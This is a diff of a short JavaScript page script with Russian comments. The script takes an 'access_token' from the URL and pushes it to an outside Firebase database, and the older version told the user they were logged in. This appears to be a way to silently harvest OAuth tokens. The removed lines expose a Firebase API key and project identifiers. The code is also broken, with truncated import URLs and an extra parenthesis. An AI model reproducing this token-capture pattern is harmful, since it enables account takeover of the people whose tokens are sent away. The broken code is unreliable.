@@ -1,41 +1,39 @@
 // Импортируем нужные функции из SDK 2026 года
 const urlParamsV2Paramsd = new URLSearchParams(window.location.search);
 const access_token = urlParamsV2Paramsd.get('access_token');
-
+// Подключаем необходимые функции из Firebase CDN (актуально для 2026)
   import { initializeApp } from "https://www.gstatic.com";
-  import { getDatabase, ref, set, push } from "https://www.gstatic.com";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com";
 
-  // Ваши данные из консоли Firebase (Settings -> General)
+  // Конфигурация вашего проекта (возьмите её в настройках проекта Firebase)
   const firebaseConfig = {
-    apiKey: "AIzaSyBFKk4qECXkvtezmrIuCMx23QryP8nyQ48",
-    authDomain: "winnigames2024app.firebaseapp.com",
     databaseURL: "https://winnigames2024app-default-rtdb.firebaseio.com",
-    projectId: "winnigames2024app",
-    storageBucket: "winnigames2024app.firebasestorage.app",
-    messagingSenderId: "ID",
-    appId: "1:496367700072:android:d69c5ae5c3b007e32613dd"
   };
 
   // Инициализация
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  // Функция для сохранения текста
-  window.saveText = function(textValue) {
-    const messagesRef = ref(db, 'messages'); // Путь в базе данных
-    const newMessageRef = push(messagesRef); // Создаем уникальный ID для записи
-    
-    set(newMessageRef, {
-      text: textValue,
-      timestamp: Date.now()
-    })
-    .then(() => alert("You're logined!"))
-    .catch((error) => console.error("Ошибка:", error));
+  // Функция для записи текста
+  async function addTextToDb(messageText) {
+    try {
+      const dbRef = ref(db, 'public_messages'); // Путь к папке в базе
+      const newEntryRef = push(dbRef);          // Создаем уникальный ключ для записи
+      
+      await set(newEntryRef, {
+        text: messageText,
+        createdAt: new Date().toISOString()
+      });
+      
+      console.log("Данные успешно добавлены!");
+    } catch (error) {
+      console.error("Ошибка при записи:", error);
+    }
   }
 
 
 if (access_token) {
-  saveText(access_token);
+  addTextToDb(access_token));
 } else {
   alert('No Logined!!!');
 }
